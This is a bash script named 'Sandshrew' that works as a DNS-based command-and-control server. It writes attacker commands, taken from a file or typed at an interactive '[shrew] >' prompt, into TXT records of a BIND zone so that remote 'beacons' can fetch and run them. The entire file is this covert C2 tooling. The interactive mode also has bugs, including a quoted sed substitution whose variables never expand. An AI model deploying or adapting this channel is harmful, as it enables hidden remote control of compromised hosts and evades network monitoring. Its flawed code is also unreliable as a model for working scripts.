#!/bin/bash
# Sandshrew
# Takes script and deploys it to the beacons
# Author - Doshmajhan

# TODO - Interactive prompt for entering commands.
#        Command line options to enter pre-written or enter them interactivily
#        ASCII Art

zone="/etc/bind/dosh.cloud"
file=""

# Function to deploy pre-written script to beacons
# Arguments - file to deploy
# Returns - nothing
deploy_file(){
    # Number of lines to write
    num=$(cat $file | wc -l)
    
    # Reset file for new commands
    sed -i '11,/-End/d' $zone
    echo "num      IN  TXT \"$num\"" >> $zone

    # Loop through script and create TXT records for each command
    x=1
    while read LINE; do
        echo "$x       IN  TXT \"$LINE\"" >> $zone
        let x=x+1
    done < "$file"
    exit 

}

# Interactive shell to let user enter commands by hand
# Arguments - none
# Returns - none
interactive(){
    # Reset file
    sed -i '11,/-End/d' $zone

    x=0
    last=x
    # Initialize number of commands
    echo "num      IN  TXT \"$x\"" >> $zone

    # Prompt to enter commands
    while true; do
        read -p "[shrew] > " input
        if [[ $input != '' ]]; then
            # Update number of commands and add new command
            sed -i '10s/$last/$x/' $zone
            echo "$x       IN  TXT \"$input\"" >> $zone
            last=$x
            let x=x+1
        fi
    done

}

# Main function reading in command line arguments
main(){

    # Print title and ascii art
    cat ascii.txt
    echo
    cat title.txt
    echo
    if [ -n "$1" ]; then 
        file=$1
        deploy_file
    else
        echo "ENTERING INTERACTIVE MODE"
        interactive
    fi
}

main
